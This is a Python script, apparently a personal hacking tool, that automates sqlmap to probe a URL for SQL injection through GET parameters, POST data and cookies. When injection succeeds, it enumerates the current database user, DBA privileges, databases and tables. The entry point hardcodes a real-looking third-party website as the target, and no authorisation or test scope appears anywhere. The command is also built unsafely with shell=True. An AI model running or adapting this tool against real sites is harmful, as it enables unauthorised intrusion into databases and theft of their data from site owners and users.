# -*- coding:utf-8 -*-
#__author__:langzi
#__blog__:www.langzi.fun
import re
import subprocess
import time
import os
import sys
import requests
requests.packages.urllib3.disable_warnings()
import multiprocessing
from bs4 import BeautifulSoup
from urllib.parse import urlparse



def writedata(x):
    with open('log.txt', 'a+')as aa:
        aa.write('***********************************' + '\n')
        aa.write(str(time.strftime('%Y-%m-%d:%H:%M:%S   ', time.localtime())) + x + '\n')


def Check_Inj_Result(content):
    # 检查是否存在注入，如果存在则返回内容，不存在返回None
    if 'use only' in content and '---' in content:
        return 'ACCESS'
    if '---' in content:
        return 'MYSQL'

def Get_Column(content):
    try:
        all_column_grep = re.search('(Database: .*?\[.*?)\[\d',content,re.S)
        all_column = all_column_grep.group(1)
        print('数据库下列名')
        print(all_column)
    except Exception as e:
        writedata(str(e))
def Common_Database(content):
    # if Check_Inj_Result(content):
    #     print('存在注入，开始获取通用数据')
    # 这里的判断可以在调用函数中做判断，方便后期维护
    try:
        result_info = re.search('---(.*?)---.*?\[INFO\] (the back-end DBMS is .*?)\[', content, re.S)
        inj = result_info.group(1)
        dbs = result_info.group(2)
        print(inj.replace('Parameter: ', '注入参数(方式) : ').replace('Type: ', '注入方式 : ').replace('Title: ',
                                                                                             '注入标题 : ').replace(
            'Payload: ', '注入攻击 : ') + '\n')
        print('---------')
        print(dbs.replace('the back-end DBMS is ', '数据库类型 : ').replace('web server operating system: ',
                                                                       '服务器版本 : ').replace(
            'web application technology: ', '服务器语言 : ').replace('back-end DBMS: ', '数据库版本 : ') + '\n')
    except Exception as e:
        writedata(str(e))
def Mysql_Database(content):
    try:
    # 获取当前用户，当前数据库，是否为dba权限
        current_user_grep = re.search('(current user:.*?)\[', content, re.S)
        current_user = current_user_grep.group(1).replace('current user', '当前用户')
        print(current_user)
    except Exception as e:
        writedata(str(e))

    try:
        current_db_grep = re.search('(current database:.*?)\[', content, re.S)
        current_db = current_db_grep.group(1).replace('current database', '当前数据库')
        print(current_db)
    except Exception as e:
        writedata(str(e))

    try:
        is_dba_grep = re.search('(current user is DBA:.*?)\[', content, re.S)
        is_dba = is_dba_grep.group(1)
        print(is_dba.replace('current user is DBA', '是否有DBA权限'))
    except Exception as e:
        writedata(str(e))

    try:
        # 获取所有的数据库
        all_dbs_grep = re.search('available databases.*?:(.*?)\[\d', content, re.S)
        all_dbs = all_dbs_grep.group(1)
        print('所有数据库:{}'.format(all_dbs))
    except Exception as e:
        writedata(str(e))
def Get_Mysql_Current_Data_Name(content):
    try:
    # 如果获取到当前数据库名称，就返回当前数据库名称，不然则返回None
        current_db = re.search('current database:(.*?)\[', content, re.S).group(1)
        current_db = (current_db.strip().replace("'",''))
        print(current_db)
        if current_db:
            return current_db
        else:
            return None
    except Exception as e:
        writedata(str(e))



def Run_Sqlmap(common):
    '''
    :param common: 传入的命令，比如
        python sqlmap.py -u xxxxx
    :return: sqlmap运行结果
    '''
    print(common)
    try:
        res = subprocess.Popen(common, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read().decode()
        print(result)
        writedata(result)
    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    finally:
        return result





def main(url):
    Scan_Status = 0
    # 这个用作判断是否完整的写入了数据，
    # 如果完整的写入，则就不需要使用后面的post和cookie注入了
    '''
    - 判断注入(如果有)
        优先写入 通用数据

            判断是mysql 还是 access 类
            access ： 调用tables
            mysql ： 写入数据库信息（当前用户，数据库名等待）

            mysql 出现权限问题只能读一张表(判断返回的结果中有数据库名的话)
            mysql：获取该数据库下所有的表名

    :param url:
    :return:
    '''
    common_1 = 'python sqlmap.py -u {} --random-agent --dbs  --current-user --current-db --is-db --batch'.format(url)
    result_1 = Run_Sqlmap(common_1)
    # 这里获取注入的结果 有限判断是否有注入
    if Check_Inj_Result(result_1):
        # 优先写入通用结果
        Common_Database(result_1)

    if Check_Inj_Result(result_1) == 'ACCESS':
        # 如果为access类，需要获取表的名
        common_2 = 'python sqlmap.py -u {} --tables --random-agent --batch'.format(url)
        result_2 = Run_Sqlmap(common_2)
        # 尝试写入表名
        Get_Column(result_2)
        Scan_Status = 1
        # access到此为止就ok了

    if Check_Inj_Result(result_1) == 'MYSQL':
        # 如果为mysql类，优先写入mysql类通用数据
        Mysql_Database(result_1)
        Scan_Status = 1
        current_db = Get_Mysql_Current_Data_Name(result_1)
        # 获取当前数据库名，尝试获取表明
        if current_db:
            common_3 = 'python sqlmap.py -u {} -D {} --tables --random-agent --batch'.format(url,current_db)
            result_3 = Run_Sqlmap(common_3)
            # 如果真的获取到了表，则写入
            Get_Column(result_3)
            Scan_Status = 1
            # MYSQL到此为止就ok了
    if Scan_Status == 1:
        return 'SCAN OVER'

    # 到现在位置，简单的注入模型完成，下面则尝试进行cookie和post高等级注入
    urls, datas = url.split('?')[0], url.split('?')[1]
    # 这里截断出url 和 values


    common_4 = 'python sqlmap.py -u {} --data {} --level 3  --random-agent --dbs  --current-user --current-db --is-db --batch'.format(urls,datas)
    #common_6 = 'sqlmap.py -u {} --cookie {} --level 3  --random-agent --dbs  --current-user --current-db --is-db --batch'

    result_4 = Run_Sqlmap(common_4)
    if Check_Inj_Result(result_4):
        Common_Database(result_4)

    if Check_Inj_Result(result_4) == 'ACCESS':
        common_5 = 'python sqlmap.py -u {} --data {} --tables --level 3 --random-agent --batch'.format(urls,datas)
        result_5 = Run_Sqlmap(common_5)
        Get_Column(result_5)
        Scan_Status = 1

    if Check_Inj_Result(result_4) == 'MYSQL':
        Mysql_Database(result_4)
        Scan_Status = 1
        current_db = Get_Mysql_Current_Data_Name(result_4)
        if current_db:
            common_6 = 'python sqlmap.py -u {} --data {} -D {} --level 3 --tables  --random-agent --batch'.format(urls,datas,current_db)
            result_6 = Run_Sqlmap(common_6)
            Get_Column(result_6)
            Scan_Status = 1
    if Scan_Status == 1:
        return 'SCAN OVER'


    common_4 = 'python sqlmap.py -u {} --cookie {} --level 3  --random-agent --dbs  --current-user --current-db --is-db --batch'.format(
        urls, datas)

    result_4 = Run_Sqlmap(common_4)
    if Check_Inj_Result(result_4):
        Common_Database(result_4)

    if Check_Inj_Result(result_4) == 'ACCESS':
        common_5 = 'python sqlmap.py -u {} --cookie {} --tables --level 3  --random-agent --batch'.format(urls, datas)
        result_5 = Run_Sqlmap(common_5)
        Get_Column(result_5)
        Scan_Status = 1

    if Check_Inj_Result(result_4) == 'MYSQL':
        Mysql_Database(result_4)
        Scan_Status = 1
        current_db = Get_Mysql_Current_Data_Name(result_4)
        if current_db:
            common_6 = 'python sqlmap.py -u {} --cookie {} -D {} --level 3 --tables  --random-agent --batch'.format(urls,
                                                                                                                    datas,
                                                                                                                  current_db)
            result_6 = Run_Sqlmap(common_6)
            Get_Column(result_6)
            Scan_Status = 1
    if Scan_Status == 1:
        return 'SCAN OVER'









if __name__ == '__main__':
    main('http://shpuda.com.cn/dzuixinzixun-822*.html')

